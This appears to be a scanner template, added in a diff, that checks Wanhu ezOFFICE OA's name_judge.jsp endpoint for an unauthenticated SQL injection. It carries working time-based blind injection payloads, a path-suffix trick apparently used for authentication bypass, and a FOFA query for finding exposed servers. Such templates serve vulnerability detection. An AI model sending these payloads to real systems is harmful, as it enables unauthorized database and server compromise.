@@ -1,0 +1,39 @@
+id: wanhu-oa-name-judge-sqli
+
+info:
+  name: 万户OA name_judge.jsp SQL注入漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |-
+    万户OA ezoffice 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE name_judge.jsp 接口存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。
+    fofa：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"
+  reference:
+    - https://mrxn.net/jswz/defaultroot-ezOFFICE-name_judge-sqli.html
+  tags: wanghu,oa,sqli
+  created: 2025/08/27
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',5)--&govFormName=1&formId=1
+    expression: |
+      response.status == 200 && response.latency <= 7000 &&  response.latency >= 5000
+
+  r1:
+    request:
+      method: POST
+      path: /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',10)--&govFormName=1&formId=1
+    expression: |
+      response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+
+expression: r0() && r1()
